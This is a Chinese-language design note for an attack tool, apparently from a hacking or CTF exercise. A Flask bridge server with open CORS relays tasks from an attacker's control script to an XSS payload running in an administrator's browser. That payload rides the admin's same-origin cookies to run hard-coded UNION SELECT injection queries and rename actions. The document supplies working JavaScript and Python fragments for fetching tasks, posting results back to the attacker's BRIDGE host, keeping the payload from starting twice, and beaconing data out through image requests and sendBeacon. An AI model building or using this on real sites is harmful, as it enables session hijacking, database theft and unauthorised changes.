## 通信结构
- hacker 主控脚本
- hacker Flask桥接服务器 
- XSS 浏览器代理

### hacker Flask桥接服务器

单任务、长轮询的桥接服务器（被动接收连接并返回内容）
任务使用独特序列号
- 设计，单任务并发模型，新任务将覆盖旧任务
    ```py
    app.run(host=, port=, threaded=True)
    ```
    - 全局共享状态
        ```py
        from threading import Condition

        current_task = None     # 待执行任务
        current_result = None   # 已完成结果
        cv = Condition()        # 线程同步（锁/阻塞/唤醒）
        ```
    - 跨域头部  
        - 跨域触发 CORS 预检 `OPTIONS` 方法，应当放行 
        - 非默认内容类型的请求，如 JSON 需设置 `Content-Type` 头部
        ```py
        @app.after_request
        def add_cors_headers(resp):
            resp.headers["Access-Control-Allow-Origin"] = "*"
            resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
            resp.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS, HEAD"
            return resp            
        ```
- 主控脚本接口
    - 主控->桥接，主控发布查询任务 `POST /api/send_task`。
        ```py
        with cv:
            current_task = data
            current_result = None
            cv.notify_all()
        ```
        - 逻辑
            - 主控发布新任务，同时覆盖旧任务
            - 清空旧结果，确保主控等待当前任务的新结果
            - 唤醒，若XSS阻塞等待新任务

        - 修改名称，使用 JSON 格式（python字典转JSON）
            - seq

        - 查询数据库，均为固定字符串，硬编码到初始XSS
            - 查询URL
            - 载荷 固定的 UNION SELECT 字符串
            - 提取

    - 主控<-桥接 获取查询结果 `GET /api/get_result?seq=N`
        ```py
        cv.wait_for(lambda: current_result is not None and current_result.get("seq") == seq, timeout=timeout)
        ```
        - 概念
            - 主控接受指定seq结果
            - 若XSS代理还未提交则阻塞等待直到超时

        - seq

- XSS浏览器代理接口
    - XSS<-桥接 获取查询任务 `GET get_task?seq_next=N`
        ```py
        cv.wait_for(lambda: current_task is not None and seq_next == current_task.get("seq"), timeout=timeout)
        ```
        - 逻辑
            - XSS代理接受预期seq任务
            - 若主控还未发布则阻塞等待直到超时

        - seq_next 下一个任务编号，用于避免重复拿同一任务
    - XSS->桥接 发布查询结果 `POST send_result`
        ```py
        with cv:
            current_result = data
            cv.notify_all()
        ```
        - 逻辑
            - XSS代理发布结果
            - 唤醒，若主控阻塞等待新结果

        - seq

### 主脚本接口

- 发布任务 `/api/send_task`
    - 修改URL到桥接服务器，字典添加seq字段（调整数据类型到JSON）
- 从hacker桥接服务器获取查询结果 `/api/get_result`
    - 修改URL到桥接服务器，请求参数添加seq字段（调整数据类型）
    - 循环，若成功得到XSS的查询结果则seq+=1（解压JSON提取数据）

### XSS代理


- 概念
    - 从桥接服务器接受任务
    - 执行改名与查询
    - 将结果发布到桥接服务器
    - 此处使用持久连接不触发 ETag 刷新，从而无需使用浏览器本地储存，直接使用变量
    - admin 同源，自动携带 Cookie

- 防止重复启动
    ```js
    if (window.__agent) return;
    window.__agent = true;
    ```
    使用自定义全局变量在“当前页面”防止重复启动，若页面刷新应当使用 localStorage 
    ```js
    const KEY = "__agent_running_v1";
    if (localStorage.getItem(KEY) === "1") return;
    localStorage.setItem(KEY, "1");
    ```

- 将固定字符串放入 XSS 作为js代码常量
    - `json.dumps()` 自带引号
    - `encodeURIComponent()` 进行 URI 编码并设置对应内容类型头部

- 接受任务 `GET /get_task?seq_next=N`
    ```js
    let seq_next = 1;

    async function getTask() {
        const r = await fetch(`${BRIDGE}/get_task?seq_next=${seq_next}`);
        if (r.status !== 200) return null;
        return r.json();
        }
    ```

- 回传结果 `POST /send_result`
    ```js
    await fetch(`${BRIDGE}/send_result`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({seq: t.seq, foo: bar}),
    });
    ```

- 主循环
    ```js
    (async () => {
        for (;;) {
            const t = await getTask();
            if (!t) continue;

            await job_1(t);
            const res = await job_2();
            await sendResult(...);

            seq_next = t.seq + 1;
        }
    })();
    ```
- 调试
    - 点错误
        - `new Image()`
            无需读响应、不受 CORS 影响、基本不会阻塞主逻辑。
            ```js
            function dbg(msg) {
            (new Image()).src = `${BRIDGE}/dbg?m=` + encodeURIComponent(msg);
            }
            ```
        - `navigator.sendBeacon`
            浏览器后台发送，适合高频；页面刷新/跳转时也更可能送达。
            ```js
            function dbg2(msg) {
            const data = new Blob([msg], {type: "text/plain"});
            navigator.sendBeacon(`${BRIDGE}/dbg2`, data);
            }            
            ```
    - 全局错误
        回传 `stack`
        ```js
        window.onerror = (msg, src, line, col, err) => {
        dbg(`onerror:${msg}@${line}:${col}`);
        };
        window.onunhandledrejection = (e) => {
        dbg(`unhandledrejection:${(e.reason && e.reason.stack) || e.reason || e}`);
        };
        ```
    - 上下文日志
        fetch的响应状态错误时，捕获文本并设置上下文、状态码、错误文本长度、错误文本切片，快速定位错误位置
        ```js
        async function mustOk(r, where) {
        if (!r.ok) {
            const t = await r.text().catch(()=>"<no text>");
            dbg(`${where}: status=${r.status} len=${t.length} head=${t.slice(0,200)}`);
            throw new Error(`${where} bad status`);
        }
        return r;
        }

        const r = await fetch(url);
        await mustOk(r, "queryEnc");
        const text = await r.text();
        ```